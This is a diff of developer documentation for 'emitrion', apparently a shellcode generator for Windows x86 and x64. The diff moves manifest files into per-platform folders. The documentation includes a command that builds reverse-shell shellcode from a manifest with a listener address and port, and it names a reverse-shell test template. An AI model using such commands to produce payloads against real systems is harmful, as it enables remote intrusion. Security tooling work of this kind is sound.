@@ -13,11 +13,11 @@ uv run pytest emitrion/tests/test_encode.py -q
 uv run pytest emitrion/tests/test_workflow_x86.py::TestReverseShellTemplate -q
 
 # Build shellcode from a manifest (emitrion CLI)
-uv run emitrion emitrion/manifests/revshell.yaml --lhost 192.168.1.100 --lport 9001 --out emitter_out/
-uv run emitrion emitrion/manifests/revshell.yaml --no-assemble --out emitter_out/  # skip assembly (no assembler on Mac)
+uv run emitrion emitrion/manifests/win-x86/revshell.yaml --lhost 192.168.1.100 --lport 9001 --out emitter_out/
+uv run emitrion emitrion/manifests/win-x86/revshell.yaml --no-assemble --out emitter_out/  # skip assembly (no assembler on Mac)
 
 # x64 build (Python API, no CLI entry point yet)
-uv run python -c "from emitrion.build_x64 import build_x64; r = build_x64('emitrion/manifests/x64/run_command_x64.yaml', assemble=False); print(r.asm[:200])"
+uv run python -c "from emitrion.build_x64 import build_x64; r = build_x64('emitrion/manifests/win-x64/run_command_x64.yaml', assemble=False); print(r.asm[:200])"
 ```
 
 Python 3.13 via uv. The `.venv` is managed by uv; use `uv run` for all commands. Do not use system Python or conda.
@@ -68,7 +68,7 @@ manifest.yaml -> schema.py (load/validate)
 2. Add the template name to `CANONICAL_TEMPLATES` in `schema.py`
 3. Create a `WorkflowTemplate` subclass in `workflow/reference.py`
 4. Register it in `_load_template()` in `build_common.py`
-5. Create a manifest YAML in `manifests/`
+5. Create a manifest YAML in `manifests/win-x86/` or `manifests/win-x64/`
 6. If adding a new API category, add it to the valid set in `tests/test_api_database.py`
 
 ### Manifest structure
